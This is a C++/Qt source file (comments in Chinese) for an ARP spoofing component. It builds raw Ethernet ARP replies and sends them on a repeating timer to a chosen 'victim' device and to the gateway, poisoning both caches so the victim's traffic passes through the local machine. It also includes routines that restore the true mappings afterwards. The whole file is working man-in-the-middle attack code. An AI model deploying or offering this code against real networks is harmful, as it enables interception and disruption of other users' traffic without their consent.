#include "ArpSpoofer.h"

#include "IL2Endpoint.h"

#include <QDebug>
#include <QHostAddress>
#include <QTimer>

// 重发周期：ARP 缓存有老化时间，1.5s 足以在设备/网关刷新前压住正确条目。
static constexpr int kSpoofIntervalMs = 1500;
// heal 连发遍数：多发几遍抵消可能滞留的欺骗缓存，确保设备恢复联网。
static constexpr int kHealRepeat = 3;

ArpSpoofer::ArpSpoofer(IL2Endpoint *endpoint, QObject *parent)
    : QObject(parent), m_endpoint(endpoint), m_timer(new QTimer(this))
{
    m_timer->setInterval(kSpoofIntervalMs);
    connect(m_timer, &QTimer::timeout, this, &ArpSpoofer::tick);
}

ArpSpoofer::~ArpSpoofer()
{
    // 兜底：无论如何退出，都把被劫持设备的 ARP 还原，避免留人断网。
    healAll();
}

bool ArpSpoofer::configured() const
{
    return m_localMac.size() == 6 && m_gatewayIp.size() == 4 && m_gatewayMac.size() == 6;
}

void ArpSpoofer::configure(const QString &localMac, const QString &gatewayIp, const QString &gatewayMac)
{
    m_localMac = macToBytes(localMac);
    m_gatewayIp = ipToBytes(gatewayIp);
    m_gatewayMac = macToBytes(gatewayMac);
    if (!configured())
        qWarning() << "ArpSpoofer: 配置无效，欺骗将 no-op" << localMac << gatewayIp << gatewayMac;
}

void ArpSpoofer::startSpoof(const QString &victimMac, const QString &victimIp)
{
    if (!configured()) {
        qWarning() << "ArpSpoofer: 未配置，忽略 startSpoof" << victimMac;
        return;
    }
    const QByteArray vmac = macToBytes(victimMac);
    const QByteArray vip = ipToBytes(victimIp);
    if (vmac.size() != 6 || vip.size() != 4) {
        qWarning() << "ArpSpoofer: victim 地址非法，忽略" << victimMac << victimIp;
        return;
    }

    const Target t{vmac, vip};
    m_victims.insert(victimMac.toLower(), t);
    sendSpoof(t); // 立刻抢占一次，别等下个 tick
    if (!m_timer->isActive())
        m_timer->start();
}

void ArpSpoofer::stopSpoof(const QString &victimMac)
{
    const auto it = m_victims.find(victimMac.toLower());
    if (it == m_victims.end())
        return;
    if (configured())
        healOne(it->mac, it->ip); // 先还原再移除
    m_victims.erase(it);
    if (m_victims.isEmpty() && m_timer->isActive())
        m_timer->stop();
}

void ArpSpoofer::healAll()
{
    if (configured()) {
        for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
            healOne(it->mac, it->ip);
    }
    m_victims.clear();
    if (m_timer && m_timer->isActive())
        m_timer->stop();
}

QStringList ArpSpoofer::victims() const
{
    return m_victims.keys();
}

void ArpSpoofer::tick()
{
    if (!configured())
        return;
    for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
        sendSpoof(it.value());
}

void ArpSpoofer::sendSpoof(const Target &t)
{
    if (!m_endpoint || !configured())
        return;

    // (a) 发给 victim：sha=本机MAC，spa=网关IP → “网关 IP 在本机”，victim 出网走我们。
    const QByteArray toVictim =
        buildArpReply(t.mac, m_localMac, m_localMac, m_gatewayIp, t.mac, t.ip);
    // (b) 发给网关：sha=本机MAC，spa=victimIP → “victim IP 在本机”，回程走我们。
    const QByteArray toGateway =
        buildArpReply(m_gatewayMac, m_localMac, m_localMac, t.ip, m_gatewayMac, m_gatewayIp);

    m_endpoint->send(toVictim);
    m_endpoint->send(toGateway);
}

void ArpSpoofer::healOne(const QByteArray &victimMac, const QByteArray &victimIp)
{
    if (!m_endpoint)
        return;

    // 给 victim：网关 IP 在真实网关 MAC（还原它的默认网关映射）。
    const QByteArray toVictim =
        buildArpReply(victimMac, m_gatewayMac, m_gatewayMac, m_gatewayIp, victimMac, victimIp);
    // 给网关：victim IP 在真实 victim MAC（还原网关侧映射）。
    const QByteArray toGateway =
        buildArpReply(m_gatewayMac, victimMac, victimMac, victimIp, m_gatewayMac, m_gatewayIp);

    for (int i = 0; i < kHealRepeat; ++i) {
        m_endpoint->send(toVictim);
        m_endpoint->send(toGateway);
    }
}

QByteArray ArpSpoofer::macToBytes(const QString &mac)
{
    const QStringList parts = mac.split(QLatin1Char(':'));
    if (parts.size() != 6)
        return {};
    QByteArray out(6, char(0));
    for (int i = 0; i < 6; ++i) {
        bool ok = false;
        const uint v = parts.at(i).toUInt(&ok, 16);
        if (!ok || v > 0xFFu)
            return {};
        out[i] = static_cast<char>(v);
    }
    return out;
}

QByteArray ArpSpoofer::ipToBytes(const QString &ip)
{
    const QHostAddress addr(ip);
    bool ok = false;
    const quint32 v = addr.toIPv4Address(&ok); // 网络序无关：下面手动按大端拆字节
    if (!ok)
        return {};
    QByteArray out(4, char(0));
    out[0] = static_cast<char>((v >> 24) & 0xFFu);
    out[1] = static_cast<char>((v >> 16) & 0xFFu);
    out[2] = static_cast<char>((v >> 8) & 0xFFu);
    out[3] = static_cast<char>(v & 0xFFu);
    return out;
}

QByteArray ArpSpoofer::buildArpReply(const QByteArray &ethDst, const QByteArray &ethSrc,
                                     const QByteArray &senderMac, const QByteArray &senderIp,
                                     const QByteArray &targetMac, const QByteArray &targetIp)
{
    // 完整以太帧：14 字节以太头 + 28 字节 ARP 载荷 = 42 字节。
    QByteArray f;
    f.reserve(42);
    f.append(ethDst);            // 目的 MAC (6)
    f.append(ethSrc);            // 源 MAC   (6)
    f.append(char(0x08));        // ethertype = 0x0806 (ARP)
    f.append(char(0x06));
    f.append(char(0x00));        // htype = 0x0001 (Ethernet)
    f.append(char(0x01));
    f.append(char(0x08));        // ptype = 0x0800 (IPv4)
    f.append(char(0x00));
    f.append(char(0x06));        // hlen = 6
    f.append(char(0x04));        // plen = 4
    f.append(char(0x00));        // op = 0x0002 (reply)
    f.append(char(0x02));
    f.append(senderMac);         // sha (6)
    f.append(senderIp);          // spa (4)
    f.append(targetMac);         // tha (6)
    f.append(targetIp);          // tpa (4)
    return f;
}
